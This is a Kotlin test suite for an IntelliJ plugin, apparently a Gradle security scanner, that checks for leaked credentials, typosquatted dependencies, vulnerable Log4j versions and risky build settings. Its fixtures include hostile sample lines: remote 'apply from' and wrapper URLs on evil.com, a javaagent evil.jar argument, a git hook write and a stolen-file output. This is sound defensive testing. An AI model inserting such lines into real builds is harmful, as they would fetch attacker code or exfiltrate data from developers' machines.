package com.mohammedalaamorsi.safegradle

import com.intellij.testFramework.fixtures.BasePlatformTestCase

class SecurityCheckTests : BasePlatformTestCase() {

    // ─── CredentialLeakCheck ───────────────────────────────────────────────

    fun `test credential leak detects hardcoded api key`() {
        val check = CredentialLeakCheck()
        val code = """api_key = "s3cr3tKeyABCDEF123456""""
        val file = myFixture.configureByText("gradle.properties", code)
        val violations = check.check(file.virtualFile, code, project)
        assertNotEmpty(violations)
        assertEquals(RiskLevel.HIGH, violations[0].riskLevel)
    }

    fun `test credential leak ignores placeholder values`() {
        val check = CredentialLeakCheck()
        val code = """api_key = "changeit""""
        val file = myFixture.configureByText("gradle.properties", code)
        val violations = check.check(file.virtualFile, code, project)
        assertEmpty(violations)
    }

    fun `test credential leak detects AWS key ID`() {
        val check = CredentialLeakCheck()
        val code = """val awsKey = "AKIAIOSFODNN7EXAMPLE" """
        val file = myFixture.configureByText("build.gradle.kts", code)
        val violations = check.check(file.virtualFile, code, project)
        assertNotEmpty(violations)
        assertEquals(RiskLevel.HIGH, violations[0].riskLevel)
    }

    fun `test credential leak detects GitHub PAT`() {
        val check = CredentialLeakCheck()
        val code = """val token = "ghp_${("A".repeat(36))}" """
        val file = myFixture.configureByText("build.gradle.kts", code)
        val violations = check.check(file.virtualFile, code, project)
        assertNotEmpty(violations)
    }

    fun `test credential leak skips commented lines`() {
        val check = CredentialLeakCheck()
        val code = """// api_key = "realSecretXYZ123456""""
        val file = myFixture.configureByText("build.gradle.kts", code)
        assertTrue(check.check(file.virtualFile, code, project).isEmpty())
    }

    // ─── GradleWrapperIntegrityCheck ──────────────────────────────────────

    fun `test wrapper integrity flags unofficial distributionUrl`() {
        val check = GradleWrapperIntegrityCheck()
        val content = "distributionUrl=https\\://evil.com/gradle-8.0-bin.zip"
        val file = myFixture.configureByText("gradle-wrapper.properties", content)
        val violations = check.check(file.virtualFile, content, project)
        assertNotEmpty(violations)
        assertEquals(RiskLevel.HIGH, violations[0].riskLevel)
    }

    fun `test wrapper integrity flags missing sha256`() {
        val check = GradleWrapperIntegrityCheck()
        val content = "distributionUrl=https\\://services.gradle.org/distributions/gradle-9.2.1-bin.zip"
        val file = myFixture.configureByText("gradle-wrapper.properties", content)
        val violations = check.check(file.virtualFile, content, project)
        assertTrue(violations.any { it.riskLevel == RiskLevel.LOW })
    }

    fun `test wrapper integrity accepts official url`() {
        val check = GradleWrapperIntegrityCheck()
        val content = """
            distributionUrl=https\://services.gradle.org/distributions/gradle-9.2.1-bin.zip
            distributionSha256Sum=abc123def456abc123def456abc123def456abc123def456abc123def456abc1
        """.trimIndent()
        val file = myFixture.configureByText("gradle-wrapper.properties", content)
        val violations = check.check(file.virtualFile, content, project)
        assertTrue(violations.none { it.riskLevel == RiskLevel.HIGH && it.message.contains("official") })
    }

    // ─── DependencyConfusionCheck ──────────────────────────────────────────

    fun `test dependency confusion flags typosquatted group`() {
        val check = DependencyConfusionCheck()
        val code = """implementation "com.gooogle:guava:31.0-jre""""
        val file = myFixture.configureByText("build.gradle", code)
        val violations = check.check(file.virtualFile, code, project)
        assertNotEmpty(violations)
        assertEquals(RiskLevel.HIGH, violations[0].riskLevel)
    }

    fun `test dependency confusion passes legitimate group`() {
        val check = DependencyConfusionCheck()
        val code = """implementation "com.google.guava:guava:31.0-jre""""
        val file = myFixture.configureByText("build.gradle", code)
        assertTrue(check.check(file.virtualFile, code, project).isEmpty())
    }

    // ─── PluginInjectionCheck ─────────────────────────────────────────────

    fun `test plugin injection flags unknown plugin`() {
        val check = PluginInjectionCheck()
        val code = """id("com.suspicious.unknownplugin")"""
        val file = myFixture.configureByText("build.gradle.kts", code)
        val violations = check.check(file.virtualFile, code, project)
        assertNotEmpty(violations)
        assertEquals(RiskLevel.LOW, violations[0].riskLevel)
    }

    fun `test plugin injection passes known safe plugin`() {
        val check = PluginInjectionCheck()
        val code = """id("com.android.application")"""
        val file = myFixture.configureByText("build.gradle.kts", code)
        assertTrue(check.check(file.virtualFile, code, project).isEmpty())
    }

    fun `test plugin injection passes trusted prefix`() {
        val check = PluginInjectionCheck()
        val code = """id("org.jetbrains.kotlin.android") version "1.9.0""""
        val file = myFixture.configureByText("build.gradle.kts", code)
        assertTrue(check.check(file.virtualFile, code, project).isEmpty())
    }

    // ─── VulnerabilityCheck ───────────────────────────────────────────────

    fun `test vulnerability check flags known cve`() {
        val check = VulnerabilityCheck()
        val code = """implementation "org.apache.logging.log4j:log4j-core:2.14.1""""
        val file = myFixture.configureByText("build.gradle", code)
        val violations = check.check(file.virtualFile, code, project)
        assertNotEmpty(violations)
        assertTrue(violations[0].message.contains("CVE-2021-44228"))
    }

    fun `test vulnerability check passes safe version`() {
        val check = VulnerabilityCheck()
        val code = """implementation "org.apache.logging.log4j:log4j-core:2.17.0""""
        val file = myFixture.configureByText("build.gradle", code)
        assertTrue(check.check(file.virtualFile, code, project).none { it.message.contains("CVE") })
    }

    fun `test vulnerability check flags dynamic version`() {
        val check = VulnerabilityCheck()
        val code = """implementation "com.google.guava:guava:+""""
        val file = myFixture.configureByText("build.gradle", code)
        val violations = check.check(file.virtualFile, code, project)
        assertNotEmpty(violations)
        assertEquals(RiskLevel.MEDIUM, violations[0].riskLevel)
    }

    fun `test vulnerability check flags snapshot version`() {
        val check = VulnerabilityCheck()
        val code = """implementation "org.springframework:spring-core:6.0.0-SNAPSHOT""""
        val file = myFixture.configureByText("build.gradle", code)
        assertNotEmpty(check.check(file.virtualFile, code, project))
    }

    fun `test lockfile scanner flags vulnerable dependency in gradle lockfile`() {
        val check = VulnerabilityCheck()
        val lockContent = """
            # Lockfile
            org.apache.logging.log4j:log4j-core:2.14.1=compileClasspath,runtimeClasspath
            com.google.guava:guava:32.0.0-jre=compileClasspath
        """.trimIndent()
        val file = myFixture.configureByText("gradle.lockfile", lockContent)
        val violations = check.check(file.virtualFile, lockContent, project)
        assertNotEmpty(violations)
        val log4j = violations.first { it.line == 2 }
        assertEquals(RiskLevel.HIGH, log4j.riskLevel)
        assertTrue(log4j.message.contains("CVE-2021-44228"))
        assertEquals("2.16.0", log4j.fixVersion)
    }

    fun `test lockfile scanner passes safe lockfile`() {
        val check = VulnerabilityCheck()
        val lockContent = """
            # Lockfile
            org.apache.logging.log4j:log4j-core:2.17.0=compileClasspath
            com.google.guava:guava:32.0.0-jre=compileClasspath
        """.trimIndent()
        val file = myFixture.configureByText("compileClasspath.lockfile", lockContent)
        val violations = check.check(file.virtualFile, lockContent, project)
        assertTrue(violations.none { it.message.contains("CVE") })
    }

    fun `test lockfile flags snapshot dependency`() {
        val check = VulnerabilityCheck()
        val lockContent = "com.example:internal-lib:1.0.0-SNAPSHOT=compileClasspath"
        val file = myFixture.configureByText("gradle.lockfile", lockContent)
        val violations = check.check(file.virtualFile, lockContent, project)
        assertNotEmpty(violations)
        assertEquals(RiskLevel.MEDIUM, violations[0].riskLevel)
        assertTrue(violations[0].message.contains("snapshot"))
    }

    fun `test dependency confusion flags typosquatting in lockfile`() {
        val check = DependencyConfusionCheck()
        val lockContent = "com.gooogle.guava:guava:31.0-jre=compileClasspath"
        val file = myFixture.configureByText("gradle.lockfile", lockContent)
        val violations = check.check(file.virtualFile, lockContent, project)
        assertNotEmpty(violations)
        assertEquals(RiskLevel.HIGH, violations[0].riskLevel)
        assertTrue(violations[0].message.contains("typosquatting"))
    }

    fun `test dependency lock check flags empty lockfile`() {
        val check = DependencyLockCheck()
        val lockContent = "# Lockfile\nempty=\n"
        val file = myFixture.configureByText("gradle.lockfile", lockContent)
        val violations = check.check(file.virtualFile, lockContent, project)
        assertNotEmpty(violations)
        assertEquals(RiskLevel.LOW, violations[0].riskLevel)
        assertTrue(violations[0].message.contains("no locked dependencies"))
    }

    // ─── FileExfiltrationCheck ────────────────────────────────────────────

    fun `test file exfiltration detects FileOutputStream`() {
        val check = FileExfiltrationCheck()
        val code = """val out = FileOutputStream("/tmp/stolen.txt")"""
        val file = myFixture.configureByText("build.gradle.kts", code)
        val violations = check.check(file.virtualFile, code, project)
        assertNotEmpty(violations)
        assertEquals(RiskLevel.MEDIUM, violations[0].riskLevel)
    }

    fun `test file exfiltration detects Files copy`() {
        val check = FileExfiltrationCheck()
        val code = """Files.copy(src, dst)"""
        val file = myFixture.configureByText("build.gradle.kts", code)
        assertNotEmpty(check.check(file.virtualFile, code, project))
    }

    fun `test file exfiltration detects git hook write`() {
        val check = FileExfiltrationCheck()
        val code = """file(".git/hooks/pre-commit").writeText("evil")"""
        val file = myFixture.configureByText("build.gradle.kts", code)
        val violations = check.check(file.virtualFile, code, project)
        assertTrue(violations.any { it.riskLevel == RiskLevel.HIGH })
    }

    fun `test file exfiltration skips comments`() {
        val check = FileExfiltrationCheck()
        val code = """// FileOutputStream example"""
        val file = myFixture.configureByText("build.gradle.kts", code)
        assertTrue(check.check(file.virtualFile, code, project).isEmpty())
    }

    // ─── GitignoreExposureCheck ───────────────────────────────────────────

    fun `test gitignore exposure flags missing keystore`() {
        val check = GitignoreExposureCheck()
        val content = "build/\n.gradle/\n"
        val file = myFixture.configureByText(".gitignore", content)
        val violations = check.check(file.virtualFile, content, project)
        assertTrue(violations.any { it.message.contains("*.jks") || it.message.contains("*.keystore") })
    }

    fun `test gitignore exposure passes when keystore excluded`() {
        val check = GitignoreExposureCheck()
        val content = """
            build/
            .gradle/
            *.jks
            *.keystore
            *.p12
            *.pfx
            keystore.properties
            local.properties
            google-services.json
            GoogleService-Info.plist
            *.aab
            .env
            secrets.properties
            signing.properties
        """.trimIndent()
        val file = myFixture.configureByText(".gitignore", content)
        assertTrue(check.check(file.virtualFile, content, project).isEmpty())
    }

    // ─── NetworkActivityCheck ─────────────────────────────────────────────

    fun `test network activity detects non-whitelisted url`() {
        val check = NetworkActivityCheck()
        val code = """val url = java.net.URL("https://evil.example.com/payload")"""
        val file = myFixture.configureByText("build.gradle.kts", code)
        assertNotEmpty(check.check(file.virtualFile, code, project))
    }

    fun `test network activity skips whitelisted domain`() {
        val check = NetworkActivityCheck()
        val code = """maven { url = uri("https://repo.maven.apache.org/maven2") }"""
        val file = myFixture.configureByText("build.gradle.kts", code)
        assertTrue(check.check(file.virtualFile, code, project).isEmpty())
    }

    fun `test network activity detects http non-https url`() {
        val check = NetworkActivityCheck()
        val code = """maven { url = uri("http://evil.example.com/repo") }"""
        val file = myFixture.configureByText("build.gradle.kts", code)
        val violations = check.check(file.virtualFile, code, project)
        assertTrue(violations.any { it.riskLevel == RiskLevel.HIGH })
    }

    fun `test network activity does not flag url in comment`() {
        val check = NetworkActivityCheck()
        val code = """// see https://evil.example.com for more info"""
        val file = myFixture.configureByText("build.gradle.kts", code)
        assertTrue(check.check(file.virtualFile, code, project).isEmpty())
    }

    fun `test network activity flags jcenter deprecated`() {
        val check = NetworkActivityCheck()
        val code = "jcenter()"
        val file = myFixture.configureByText("build.gradle", code)
        val violations = check.check(file.virtualFile, code, project)
        assertNotEmpty(violations)
        assertTrue(violations[0].message.contains("shut down"))
    }

    // ─── ApplyFromCheck ───────────────────────────────────────────────────

    fun `test apply from flags remote http url`() {
        val check = ApplyFromCheck()
        val code = """apply from: "https://evil.com/malicious.gradle""""
        val file = myFixture.configureByText("build.gradle", code)
        val violations = check.check(file.virtualFile, code, project)
        assertNotEmpty(violations)
        assertEquals(RiskLevel.HIGH, violations[0].riskLevel)
    }

    fun `test apply from ignores local file`() {
        val check = ApplyFromCheck()
        val code = """apply from: "scripts/signing.gradle""""
        val file = myFixture.configureByText("build.gradle", code)
        assertTrue(check.check(file.virtualFile, code, project).isEmpty())
    }

    // ─── JvmArgsCheck ─────────────────────────────────────────────────────

    fun `test jvm args flags javaagent`() {
        val check = JvmArgsCheck()
        val content = "org.gradle.jvmargs=-Xmx4g -javaagent:/path/to/evil.jar"
        val file = myFixture.configureByText("gradle.properties", content)
        val violations = check.check(file.virtualFile, content, project)
        assertNotEmpty(violations)
        assertEquals(RiskLevel.HIGH, violations[0].riskLevel)
    }

    fun `test jvm args flags add-opens`() {
        val check = JvmArgsCheck()
        val content = "org.gradle.jvmargs=-Xmx4g --add-opens java.base/java.lang=ALL-UNNAMED"
        val file = myFixture.configureByText("gradle.properties", content)
        val violations = check.check(file.virtualFile, content, project)
        assertNotEmpty(violations)
        assertEquals(RiskLevel.MEDIUM, violations[0].riskLevel)
    }

    fun `test jvm args passes clean config`() {
        val check = JvmArgsCheck()
        val content = "org.gradle.jvmargs=-Xmx2g -XX:MaxMetaspaceSize=512m"
        val file = myFixture.configureByText("gradle.properties", content)
        assertTrue(check.check(file.virtualFile, content, project).isEmpty())
    }

    fun `test jvm args only applies to gradle properties`() {
        val check = JvmArgsCheck()
        val content = "org.gradle.jvmargs=-javaagent:/evil.jar"
        val file = myFixture.configureByText("build.gradle.kts", content)
        assertTrue(check.check(file.virtualFile, content, project).isEmpty())
    }

    // ─── BuildCacheCheck ──────────────────────────────────────────────────

    fun `test build cache flags unconditional push to remote cache`() {
        val check = BuildCacheCheck()
        val code = """
            buildCache {
                remote(HttpBuildCache) {
                    url = uri("https://cache.example.com")
                    isPush = true
                }
            }
        """.trimIndent()
        val file = myFixture.configureByText("settings.gradle.kts", code)
        val violations = check.check(file.virtualFile, code, project)
        assertEquals(1, violations.size)
        assertEquals(RiskLevel.MEDIUM, violations[0].riskLevel)
        assertEquals("build_cache", violations[0].checkId)
    }

    fun `test build cache flags push() call in remote block`() {
        val check = BuildCacheCheck()
        val code = """
            buildCache {
                remote {
                    setPush(true)
                }
            }
        """.trimIndent()
        val file = myFixture.configureByText("settings.gradle", code)
        assertTrue(check.check(file.virtualFile, code, project).any { it.riskLevel == RiskLevel.MEDIUM })
    }

    fun `test build cache allows ci-conditional push`() {
        val check = BuildCacheCheck()
        val code = """
            buildCache {
                remote(HttpBuildCache) {
                    isPush = System.getenv("CI") != null
                }
            }
        """.trimIndent()
        val file = myFixture.configureByText("settings.gradle.kts", code)
        assertTrue(check.check(file.virtualFile, code, project).isEmpty())
    }

    fun `test build cache ignores push outside a remote block`() {
        val check = BuildCacheCheck()
        val code = "isPush = true"
        val file = myFixture.configureByText("settings.gradle.kts", code)
        assertTrue(check.check(file.virtualFile, code, project).isEmpty())
    }

    fun `test build cache flags untrusted server as high risk`() {
        val check = BuildCacheCheck()
        val code = "isAllowUntrustedServer = true"
        val file = myFixture.configureByText("settings.gradle.kts", code)
        val violations = check.check(file.virtualFile, code, project)
        assertNotEmpty(violations)
        assertEquals(RiskLevel.HIGH, violations[0].riskLevel)
    }

    fun `test build cache only applies to settings files`() {
        val check = BuildCacheCheck()
        val code = "isPush = true"
        val file = myFixture.configureByText("build.gradle.kts", code)
        assertTrue(check.check(file.virtualFile, code, project).isEmpty())
    }

    // ─── PluginPortalCheck ────────────────────────────────────────────────

    fun `test plugin portal flags typosquatted plugin id`() {
        val check = PluginPortalCheck()
        val code = """id("com.diffplug.spotles") version "6.25.0""""
        val file = myFixture.configureByText("build.gradle.kts", code)
        val violations = check.check(file.virtualFile, code, project)
        assertNotEmpty(violations)
        assertEquals(RiskLevel.HIGH, violations[0].riskLevel)
        assertTrue(violations[0].message.contains("com.diffplug.spotless"))
    }

    fun `test plugin portal flags transposed-letters typosquat`() {
        val check = PluginPortalCheck()
        val code = """id("com.gradleup.shadwo") version "8.3.0""""
        val file = myFixture.configureByText("build.gradle.kts", code)
        val violations = check.check(file.virtualFile, code, project)
        assertTrue(violations.any { it.riskLevel == RiskLevel.HIGH && it.message.contains("com.gradleup.shadow") })
    }

    fun `test plugin portal allows a plugin that extends a popular id`() {
        val check = PluginPortalCheck()
        val code = """id("com.android.application.debug") version "8.5.0""""
        val file = myFixture.configureByText("build.gradle.kts", code)
        assertTrue(check.check(file.virtualFile, code, project).isEmpty())
    }

    fun `test plugin portal passes the genuine plugin id`() {
        val check = PluginPortalCheck()
        val code = """id("com.gradle.develocity") version "3.17.5""""
        val file = myFixture.configureByText("build.gradle.kts", code)
        assertTrue(check.check(file.virtualFile, code, project).isEmpty())
    }

    fun `test plugin portal flags relocated plugin id`() {
        val check = PluginPortalCheck()
        val code = """id("com.github.johnrengelman.shadow") version "8.1.1""""
        val file = myFixture.configureByText("build.gradle.kts", code)
        val violations = check.check(file.virtualFile, code, project)
        assertTrue(violations.any { it.riskLevel == RiskLevel.LOW && it.message.contains("com.gradleup.shadow") })
    }

    fun `test plugin portal flags dynamic version`() {
        val check = PluginPortalCheck()
        val code = """id("com.example.myplugin") version "1.0+""""
        val file = myFixture.configureByText("build.gradle.kts", code)
        val violations = check.check(file.virtualFile, code, project)
        assertNotEmpty(violations)
        assertEquals(RiskLevel.MEDIUM, violations[0].riskLevel)
    }

    fun `test plugin portal flags snapshot version`() {
        val check = PluginPortalCheck()
        val code = """id("com.example.myplugin") version "1.0-SNAPSHOT""""
        val file = myFixture.configureByText("build.gradle.kts", code)
        val violations = check.check(file.virtualFile, code, project)
        assertNotEmpty(violations)
        assertEquals(RiskLevel.LOW, violations[0].riskLevel)
    }

    fun `test plugin portal reads groovy plugin ids from settings`() {
        val check = PluginPortalCheck()
        val code = """id 'com.gradle.develocity' version '3.17.5'"""
        val file = myFixture.configureByText("settings.gradle", code)
        assertTrue(check.check(file.virtualFile, code, project).isEmpty())
    }

    fun `test plugin portal passes pinned plugin in version catalog`() {
        val check = PluginPortalCheck()
        val code = """
            [plugins]
            develocity = { id = "com.gradle.develocity", version = "3.17.5" }
        """.trimIndent()
        val file = myFixture.configureByText("libs.versions.toml", code)
        assertTrue(check.check(file.virtualFile, code, project).isEmpty())
    }

    fun `test plugin portal flags dynamic version in version catalog`() {
        val check = PluginPortalCheck()
        val code = """
            [plugins]
            mine = { id = "com.example.myplugin", version = "1.0+" }
        """.trimIndent()
        val file = myFixture.configureByText("libs.versions.toml", code)
        assertTrue(check.check(file.virtualFile, code, project).any { it.riskLevel == RiskLevel.MEDIUM })
    }

    // ─── DependencyVerificationCheck ──────────────────────────────────────

    fun `test dependency verification flags disabled verify-metadata`() {
        val check = DependencyVerificationCheck()
        val content = "<verify-metadata>false</verify-metadata>"
        val file = myFixture.configureByText("verification-metadata.xml", content)
        val violations = check.check(file.virtualFile, content, project)
        assertNotEmpty(violations)
        assertEquals(RiskLevel.MEDIUM, violations[0].riskLevel)
    }

    fun `test dependency verification flags wildcard trust rule`() {
        val check = DependencyVerificationCheck()
        val content = """<trust group=".*" regex="true"/>"""
        val file = myFixture.configureByText("verification-metadata.xml", content)
        val violations = check.check(file.virtualFile, content, project)
        assertNotEmpty(violations)
        assertEquals(RiskLevel.HIGH, violations[0].riskLevel)
    }

    fun `test dependency verification flags weak checksums only`() {
        val check = DependencyVerificationCheck()
        val content = "<sha1>abc</sha1>"
        val file = myFixture.configureByText("verification-metadata.xml", content)
        val violations = check.check(file.virtualFile, content, project)
        assertTrue(violations.any { it.riskLevel == RiskLevel.LOW && it.message.contains("SHA-1") })
    }

    fun `test dependency verification passes strong checksums`() {
        val check = DependencyVerificationCheck()
        val content = "<sha256>abc</sha256>"
        val file = myFixture.configureByText("verification-metadata.xml", content)
        assertTrue(check.check(file.virtualFile, content, project).isEmpty())
    }

    fun `test dependency verification stays silent for settings without a wrapper`() {
        val check = DependencyVerificationCheck()
        val code = "rootProject.name = \"x\""
        val file = myFixture.configureByText("settings.gradle.kts", code)
        assertTrue(check.check(file.virtualFile, code, project).isEmpty())
    }
}
